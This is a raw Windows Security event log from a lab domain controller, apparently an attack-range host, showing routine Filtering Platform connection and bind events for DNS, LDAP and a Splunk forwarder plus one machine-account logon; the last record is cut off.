03/01/2021 10:54:22 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382330
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		61056
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:22 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382329
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		::1
	Source Port:		64823
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:54:22 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382328
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		64823
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:54:22 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382327
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		64823
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:54:22 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382326
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		64823
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:54:22 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382325
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55140
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:22 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382324
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55140
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:54:26 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382334
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59980
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:28 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382336
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55142
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:28 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382335
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55142
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:54:30 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4634
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logoff
OpCode=Info
RecordNumber=1382343
Keywords=Audit Success
Message=An account was logged off.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x4FF2551

Logon Type:			3

This event is generated when a logon session is destroyed. It may be positively correlated with a logon event using the Logon ID value. Logon IDs are only unique between reboots on the same computer.
03/01/2021 10:54:30 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4624
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Logon
OpCode=Info
RecordNumber=1382342
Keywords=Audit Success
Message=An account was successfully logged on.

Subject:
	Security ID:		NULL SID
	Account Name:		-
	Account Domain:		-
	Logon ID:		0x0

Logon Information:
	Logon Type:		3
	Restricted Admin Mode:	-
	Virtual Account:		No
	Elevated Token:		Yes

Impersonation Level:		Impersonation

New Logon:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE.LOCAL
	Logon ID:		0x4FF2551
	Linked Logon ID:		0x0
	Network Account Name:	-
	Network Account Domain:	-
	Logon GUID:		{CC923A93-F001-0671-4717-F77291746201}

Process Information:
	Process ID:		0x0
	Process Name:		-

Network Information:
	Workstation Name:	-
	Source Network Address:	::1
	Source Port:		55143

Detailed Authentication Information:
	Logon Process:		Kerberos
	Authentication Package:	Kerberos
	Transited Services:	-
	Package Name (NTLM only):	-
	Key Length:		0

This event is generated when a logon session is created. It is generated on the computer that was accessed.

The subject fields indicate the account on the local system which requested the logon. This is most commonly a service such as the Server service, or a local process such as Winlogon.exe or Services.exe.

The logon type field indicates the kind of logon that occurred. The most common types are 2 (interactive) and 3 (network).

The New Logon fields indicate the account for whom the new logon was created, i.e. the account that was logged on.

The network fields indicate where a remote logon request originated. Workstation name is not always available and may be left blank in some cases.

The impersonation level field indicates the extent to which a process in the logon session can impersonate.

The authentication information fields provide detailed information about this specific logon request.
	- Logon GUID is a unique identifier that can be used to correlate this event with a KDC event.
	- Transited services indicate which intermediate services have participated in this logon request.
	- Package name indicates which sub-protocol was used among the NTLM protocols.
	- Key length indicates the length of the generated session key. This will be 0 if no session key was requested.
03/01/2021 10:54:30 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=4672
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Special Logon
OpCode=Info
RecordNumber=1382341
Keywords=Audit Success
Message=Special privileges assigned to new logon.

Subject:
	Security ID:		NT AUTHORITY\SYSTEM
	Account Name:		WIN-DC-974$
	Account Domain:		ATTACKRANGE
	Logon ID:		0x4FF2551

Privileges:		SeSecurityPrivilege
			SeBackupPrivilege
			SeRestorePrivilege
			SeTakeOwnershipPrivilege
			SeDebugPrivilege
			SeSystemEnvironmentPrivilege
			SeLoadDriverPrivilege
			SeImpersonatePrivilege
			SeDelegateSessionUserImpersonatePrivilege
			SeEnableDelegationPrivilege
03/01/2021 10:54:30 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382340
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		852
	Application Name:	\device\harddiskvolume1\windows\system32\lsass.exe

Network Information:
	Direction:		Inbound
	Source Address:		::1
	Source Port:		55143
	Destination Address:	::1
	Destination Port:		389
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:54:30 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382339
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2684
	Application Name:	\device\harddiskvolume1\windows\adws\microsoft.activedirectory.webservices.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		55143
	Destination Address:	::1
	Destination Port:		389
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:54:30 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382338
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2684
	Application Name:	\device\harddiskvolume1\windows\adws\microsoft.activedirectory.webservices.exe

Network Information:
	Source Address:		::
	Source Port:		55143
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:54:30 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382337
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60906
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:31 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382347
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60759
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:31 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382346
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		63816
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:54:31 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382345
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		63816
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:54:31 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382344
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		63816
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:54:32 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382348
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		63816
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:33 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382350
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55144
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:33 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382349
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55144
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:54:34 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382355
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59848
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:34 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382354
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		::1
	Source Port:		57049
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:54:34 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382353
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		57049
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:54:34 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382352
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		57049
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:54:34 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382351
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		57049
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:54:35 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382357
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		127.0.0.1
	Source Port:		57049
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65787
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	44
03/01/2021 10:54:35 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382356
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		127.0.0.1
	Source Port:		57049
	Destination Address:	127.0.0.1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65789
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:38 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382359
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55145
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:38 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382358
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55145
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:54:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382362
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55146
	Destination Address:	8.240.191.254
	Destination Port:		80
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382361
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55146
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:54:39 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382360
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59333
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:42 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382363
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		59908
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:43 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382365
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		55147
	Destination Address:	10.0.1.12
	Destination Port:		8000
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:43 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382364
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		2272
	Application Name:	\device\harddiskvolume1\program files\splunkuniversalforwarder\etc\apps\splunk_ta_stream\windows_x86_64\bin\streamfwd.exe

Network Information:
	Source Address:		0.0.0.0
	Source Port:		55147
	Protocol:		6

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:54:46 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382370
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Outbound
	Source Address:		10.0.1.14
	Source Port:		60713
	Destination Address:	10.0.0.2
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	69604
	Layer Name:		Connect
	Layer Run-Time ID:	48
03/01/2021 10:54:46 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382369
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		2664
	Application Name:	\device\harddiskvolume1\windows\system32\dns.exe

Network Information:
	Direction:		Inbound
	Source Address:		::1
	Source Port:		58273
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65786
	Layer Name:		Receive/Accept
	Layer Run-Time ID:	46
03/01/2021 10:54:46 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382368
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a connection.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Direction:		Outbound
	Source Address:		::1
	Source Port:		58273
	Destination Address:	::1
	Destination Port:		53
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	65788
	Layer Name:		Connect
	Layer Run-Time ID:	50
03/01/2021 10:54:46 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382367
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		58273
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	38
03/01/2021 10:54:46 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5158
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382366
Keywords=Audit Success
Message=The Windows Filtering Platform has permitted a bind to a local port.

Application Information:
	Process ID:		1316
	Application Name:	\device\harddiskvolume1\windows\system32\svchost.exe

Network Information:
	Source Address:		::
	Source Port:		58273
	Protocol:		17

Filter Information:
	Filter Run-Time ID:	0
	Layer Name:		Resource Assignment
	Layer Run-Time ID:	36
03/01/2021 10:54:47 PM
LogName=Security
SourceName=Microsoft Windows security auditing.
EventCode=5156
EventType=0
Type=Information
ComputerName=win-dc-974.attackrange.local
TaskCategory=Filtering Platform Connection
OpCode=Info
RecordNumber=1382377
Keywords=Audit Success
